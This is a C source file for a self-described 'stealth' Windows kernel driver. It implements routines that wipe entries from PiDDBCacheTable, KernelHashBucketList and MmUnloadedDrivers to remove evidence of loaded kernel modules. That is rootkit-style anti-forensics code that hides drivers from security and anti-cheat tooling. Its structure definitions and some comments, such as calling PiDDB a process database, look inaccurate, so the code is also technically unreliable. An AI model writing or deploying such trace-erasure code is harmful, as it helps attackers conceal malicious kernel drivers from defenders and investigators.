/*
 * Stealth Kernel Driver - Erasure Operations
 *
 * Implements erasure routines for PiDDBCacheTable, KernelHashBucketList,
 * and MmUnloadedDrivers to remove traces from kernel structures.
 *
 * Target: Windows 10/11 x64
 * Environment: No-CRT
 */

#include "StealthDriver.h"

static PERASURE_CONTEXT g_ActiveErasureContext = NULL;

#ifdef ALLOC_PRAGMA
    #pragma alloc_text(PAGE, ErasePiDDBCacheTable)
    #pragma alloc_text(PAGE, EraseKernelHashBucketList)
    #pragma alloc_text(PAGE, EraseMmUnloadedDrivers)
    #pragma alloc_text(PAGE, ExecuteErasureOperations)
    #pragma alloc_text(PAGE, ClearErasureStatistics)
#endif // ALLOC_PRAGMA

//------------------------------------------------------------------------------
// Internal Function Prototypes
//------------------------------------------------------------------------------

static VOID EraseCacheTableEntry(
    IN PCACHE_TABLE_ENTRY Entry
);

static VOID EraseHashBucketEntry(
    IN PHASH_BUCKET_ENTRY Entry
);

static VOID EraseUnloadedDriverEntry(
    IN PUNLOADED_DRIVER_ENTRY Entry
);

static NTSTATUS InitializeErasureContext(
    IN OUT PERASURE_CONTEXT Context,
    IN ULONG ErasureFlags
);

//------------------------------------------------------------------------------
// PiDDBCacheTable Erasure Routine
//------------------------------------------------------------------------------

/*
 * ErasePiDDBCacheTable
 *
 * Erases process information from the PiDDB (Process Information Database)
 * cache table to remove traces of process instrumentation.
 *
 * Parameters:
 *   CacheTable - Pointer to the cache table structure containing process entries
 *
 * Notes:
 *   - Clears device path strings from cache entries
 *   - Zeroes cached data buffers
 *   - Resets timestamps and state information
 *   - Operates without acquiring global locks (caller responsible)
 */

VOID NTAPI ErasePiDDBCacheTable(
    IN PVOID CacheTable
)
{
    PCACHE_TABLE_ENTRY CurrentEntry;
    ULONG EntryCount;

    if (CacheTable == NULL) {
        return;
    }

    CurrentEntry = (PCACHE_TABLE_ENTRY)CacheTable;
    EntryCount = HASH_BUCKET_COUNT;

    if (g_ActiveErasureContext != NULL &&
        g_ActiveErasureContext->PiDDBCacheSize >= sizeof(CACHE_TABLE_ENTRY)) {
        EntryCount = g_ActiveErasureContext->PiDDBCacheSize / sizeof(CACHE_TABLE_ENTRY);
    }

    for (ULONG i = 0; i < EntryCount; i++) {
        EraseCacheTableEntry(CurrentEntry);
        CurrentEntry++;
    }
}

//------------------------------------------------------------------------------
// Kernel Hash Bucket List Erasure Routine
//------------------------------------------------------------------------------

/*
 * EraseKernelHashBucketList
 *
 * Erases entries from a specific kernel hash bucket list to remove
 * instrumentation artifacts from kernel hash tables.
 *
 * Parameters:
 *   HashBucketIndex - Index of the hash bucket to erase
 *
 * Notes:
 *   - Targets specific bucket based on index parameter
 *   - Clears entry data pointers and metadata
 *   - Resets reference counts and timestamps
 *   - Preserves bucket structure for future allocations
 */

VOID NTAPI EraseKernelHashBucketList(
    IN USHORT HashBucketIndex
)
{
    PHASH_BUCKET_LIST BucketList;
    PHASH_BUCKET_ENTRY CurrentEntry;
    PHASH_BUCKET_ENTRY NextEntry;
    ULONG EntryCount;

    if (HashBucketIndex >= HASH_BUCKET_COUNT) {
        return;
    }

    if (g_ActiveErasureContext == NULL) {
        return;
    }

    BucketList = (PHASH_BUCKET_LIST)g_ActiveErasureContext->HashBucketBase;
    if (BucketList == NULL) {
        return;
    }

    EntryCount = 0;

    // Traverse entries in the specified bucket
    CurrentEntry = BucketList->Entries[HashBucketIndex];

    while (CurrentEntry != NULL) {
        NextEntry = CurrentEntry->Next;

        EraseHashBucketEntry(CurrentEntry);

        // Move to next entry
        CurrentEntry = NextEntry;
        EntryCount++;
    }

    BucketList->Entries[HashBucketIndex] = NULL;

    // Update bucket statistics
    if (EntryCount > 0) {
        if (BucketList->TotalEntryCount >= EntryCount) {
            BucketList->TotalEntryCount -= EntryCount;
        }
        if (BucketList->OccupiedBucketCount > 0) {
            BucketList->OccupiedBucketCount--;
        }
    }
}

//------------------------------------------------------------------------------
// MmUnloadedDrivers Erasure Routine
//------------------------------------------------------------------------------

/*
 * EraseMmUnloadedDrivers
 *
 * Erases unloaded driver entries from the MmUnloadedDrivers list to
 * remove evidence of previously loaded kernel modules.
 *
 * Parameters:
 *   UnloadedDriverCount - Number of unloaded driver entries to process
 *
 * Notes:
 *   - Processes up to UnloadedDriverCount entries
 *   - Clears driver name strings and memory ranges
 *   - Resets checksum and timestamp information
 *   - Maintains list integrity for subsequent operations
 */

VOID NTAPI EraseMmUnloadedDrivers(
    IN ULONG UnloadedDriverCount
)
{
    PUNLOADED_DRIVER_ENTRY Entry;
    PUNLOADED_DRIVER_ENTRY CurrentEntry;
    ULONG MaxEntries;

    if (UnloadedDriverCount == 0) {
        return;
    }

    // Limit to maximum supported entries
    MaxEntries = (UnloadedDriverCount < UNLOADED_DRIVER_MAX) ?
                  UnloadedDriverCount : UNLOADED_DRIVER_MAX;

    if (g_ActiveErasureContext == NULL) {
        return;
    }

    // Access unloaded driver array from active erasure context
    Entry = (PUNLOADED_DRIVER_ENTRY)g_ActiveErasureContext->UnloadedDriverBase;
    if (Entry == NULL) {
        return;
    }

    CurrentEntry = Entry;

    for (ULONG i = 0; i < MaxEntries; i++) {
        // Clear driver name Unicode string
        EraseUnloadedDriverEntry(CurrentEntry);

        CurrentEntry++;
    }
}

//------------------------------------------------------------------------------
// Erasure Operation Execution
//------------------------------------------------------------------------------

/*
 * ExecuteErasureOperations
 *
 * Executes a coordinated set of erasure operations based on the
 * provided erasure context and flags.
 *
 * Parameters:
 *   ErasureContext - Context structure containing erasure parameters and statistics
 *
 * Returns:
 *   STATUS_SUCCESS on completion, appropriate NTSTATUS code on error
 *
 * Notes:
 *   - Processes operations based on ErasureFlags in context
 *   - Updates statistics for monitoring and debugging
 *   - Supports selective or comprehensive erasure via flags
 */

NTSTATUS ExecuteErasureOperations(
    IN OUT PERASURE_CONTEXT ErasureContext
)
{
    NTSTATUS Status;

    if (ErasureContext == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    // Initialize context if needed
    if (ErasureContext->ErasureFlags == 0) {
        Status = InitializeErasureContext(
            ErasureContext,
            ERASURE_FLAG_ALL
        );

        if (!IS_SUCCESS(Status)) {
            return Status;
        }
    }

    // Record start time
    ErasureContext->StartTime = KeQueryPerformanceCounter(NULL);
    ErasureContext->PiDDBCacheEntriesProcessed = 0;
    ErasureContext->HashBucketsCleared = 0;
    ErasureContext->DriversErased = 0;
    g_ActiveErasureContext = ErasureContext;

    // Execute PiDDBCacheTable erasure
    if ((ErasureContext->ErasureFlags & ERASURE_FLAG_PIDDDB_CACHE) != 0) {
        ErasePiDDBCacheTable(ErasureContext->PiDDBCacheBase);
        if (ErasureContext->PiDDBCacheSize >= sizeof(CACHE_TABLE_ENTRY)) {
            ErasureContext->PiDDBCacheEntriesProcessed =
                ErasureContext->PiDDBCacheSize / sizeof(CACHE_TABLE_ENTRY);
        }
        ErasureContext->CompletedFlags |= ERASURE_FLAG_PIDDDB_CACHE;
    }

    // Execute Hash Bucket erasure
    if ((ErasureContext->ErasureFlags & ERASURE_FLAG_HASH_BUCKET) != 0) {
        for (USHORT i = 0; i < HASH_BUCKET_COUNT; i++) {
            EraseKernelHashBucketList(i);
            ErasureContext->HashBucketsCleared++;
        }
        ErasureContext->CompletedFlags |= ERASURE_FLAG_HASH_BUCKET;
    }

    // Execute Unloaded Drivers erasure
    if ((ErasureContext->ErasureFlags & ERASURE_FLAG_UNLOADED_DRIVER) != 0) {
        EraseMmUnloadedDrivers(ErasureContext->UnloadedDriverCount);
        ErasureContext->DriversErased =
            (ErasureContext->UnloadedDriverCount < UNLOADED_DRIVER_MAX) ?
                ErasureContext->UnloadedDriverCount : UNLOADED_DRIVER_MAX;
        ErasureContext->CompletedFlags |= ERASURE_FLAG_UNLOADED_DRIVER;
    }

    // Record end time and calculate statistics
    ErasureContext->EndTime = KeQueryPerformanceCounter(NULL);

    // Calculate total operations completed
    ErasureContext->EntriesProcessed =
        ErasureContext->PiDDBCacheEntriesProcessed +
        ErasureContext->HashBucketsCleared +
        ErasureContext->DriversErased;

    g_ActiveErasureContext = NULL;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// Erasure Statistics Management
//------------------------------------------------------------------------------

/*
 * ClearErasureStatistics
 *
 * Resets all statistics counters and timing information in the
 * erasure context structure.
 *
 * Parameters:
 *   ErasureContext - Context structure containing statistics to clear
 *
 * Notes:
 *   - Preserves configuration flags
 *   - Clears operational statistics only
 *   - Suitable for periodic statistics reset
 */

VOID ClearErasureStatistics(
    IN PERASURE_CONTEXT ErasureContext
)
{
    if (ErasureContext == NULL) {
        return;
    }

    // Clear statistics counters
    ErasureContext->TotalBytesErased = 0;
    ErasureContext->EntriesProcessed = 0;
    ErasureContext->ErrorsEncountered = 0;

    // Clear PiDDBCacheTable statistics
    ErasureContext->PiDDBCacheEntriesProcessed = 0;

    // Clear Hash Bucket statistics
    ErasureContext->HashBucketsCleared = 0;

    // Clear Unloaded Driver statistics
    ErasureContext->DriversErased = 0;

    // Reset timing information
    ErasureContext->StartTime.QuadPart = 0;
    ErasureContext->EndTime.QuadPart = 0;

    // Clear completed flags (preserve ErasureFlags configuration)
    ErasureContext->CompletedFlags = 0;
}

//------------------------------------------------------------------------------
// Internal Helper Functions
//------------------------------------------------------------------------------

/*
 * InitializeErasureContext
 *
 * Initializes the erasure context structure with default values
 * based on specified operation flags.
 *
 * Parameters:
 *   Context - Erasure context structure to initialize
 *   ErasureFlags - Flags specifying which operations to configure
 *
 * Returns:
 *   STATUS_SUCCESS on completion, appropriate NTSTATUS code on error
 */

static NTSTATUS InitializeErasureContext(
    IN OUT PERASURE_CONTEXT Context,
    IN ULONG ErasureFlags
)
{
    if (Context == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    // Set operation flags
    Context->ErasureFlags = ErasureFlags;
    Context->CompletedFlags = 0;

    // Initialize statistics to zero
    Context->TotalBytesErased = 0;
    Context->EntriesProcessed = 0;
    Context->ErrorsEncountered = 0;
    Context->PiDDBCacheEntriesProcessed = 0;
    Context->HashBucketsCleared = 0;
    Context->DriversErased = 0;

    // Initialize timing
    Context->StartTime.QuadPart = 0;
    Context->EndTime.QuadPart = 0;

    // Clear reserved fields
    RtlSecureZeroMemory(
        Context->Reserved,
        sizeof(Context->Reserved)
    );

    return STATUS_SUCCESS;
}

/*
 * EraseCacheTableEntry
 *
 * Erases a single cache table entry.
 *
 * Parameters:
 *   Entry - Cache table entry to erase
 */

static VOID EraseCacheTableEntry(
    IN PCACHE_TABLE_ENTRY Entry
)
{
    if (Entry == NULL) {
        return;
    }

    // Clear device path
    RtlSecureZeroMemory(
        &Entry->DevicePath,
        sizeof(UNICODE_STRING)
    );

    // Clear cached data
    Entry->DeviceObject = NULL;
    Entry->CachedData = NULL;
    Entry->CachedDataSize = 0;

    // Reset timestamps
    Entry->CreationTime.QuadPart = 0;
    Entry->LastAccessTime.QuadPart = 0;
    Entry->ExpirationTime.QuadPart = 0;

    // Clear state
    Entry->State = 0;
    Entry->IsDirty = FALSE;
    Entry->ReferenceCount = 0;
    // Preserve linkage fields to avoid corrupting external list/tree ownership.
    RtlSecureZeroMemory(Entry->Reserved, sizeof(Entry->Reserved));
}

/*
 * EraseHashBucketEntry
 *
 * Erases a single hash bucket entry.
 *
 * Parameters:
 *   Entry - Hash bucket entry to erase
 */

static VOID EraseHashBucketEntry(
    IN PHASH_BUCKET_ENTRY Entry
)
{
    if (Entry == NULL) {
        return;
    }

    // Clear entry data
    Entry->HashKey = 0;
    Entry->EntryData = NULL;
    Entry->EntrySize = 0;

    // Reset timestamps
    Entry->CreationTime.QuadPart = 0;
    Entry->LastAccessTime.QuadPart = 0;

    // Clear metadata
    Entry->ReferenceCount = 0;
    Entry->Flags = 0;

    // Clear list pointers
    Entry->Next = NULL;
    Entry->Prev = NULL;
    RtlSecureZeroMemory(Entry->Reserved, sizeof(Entry->Reserved));
}

/*
 * EraseUnloadedDriverEntry
 *
 * Erases a single unloaded driver entry.
 *
 * Parameters:
 *   Entry - Unloaded driver entry to erase
 */

static VOID EraseUnloadedDriverEntry(
    IN PUNLOADED_DRIVER_ENTRY Entry
)
{
    PWCHAR DriverNameBuffer;
    USHORT DriverNameMaximumLength;

    if (Entry == NULL) {
        return;
    }

    // Preserve UNICODE_STRING header pointers to avoid leaving invalid metadata.
    DriverNameBuffer = Entry->DriverName.Buffer;
    DriverNameMaximumLength = Entry->DriverName.MaximumLength;

    if (DriverNameBuffer != NULL && DriverNameMaximumLength > 0) {
        RtlSecureZeroMemory(DriverNameBuffer, DriverNameMaximumLength);
    }

    Entry->DriverName.Length = 0;
    Entry->DriverName.MaximumLength = DriverNameMaximumLength;
    Entry->DriverName.Buffer = DriverNameBuffer;
    Entry->DriverNameLength = 0;

    // Clear memory range
    Entry->StartAddress = 0;
    Entry->EndAddress = 0;
    Entry->ImageSize = 0;

    // Reset checksum and characteristics
    Entry->CheckSum = 0;
    Entry->TimeDateStamp = 0;
    Entry->Characteristics = 0;
    Entry->NumberOfSections = 0;

    // Clear timestamp
    Entry->UnloadTime.QuadPart = 0;
    RtlSecureZeroMemory(&Entry->ListEntry, sizeof(LIST_ENTRY));
    RtlSecureZeroMemory(Entry->Reserved, sizeof(Entry->Reserved));
}
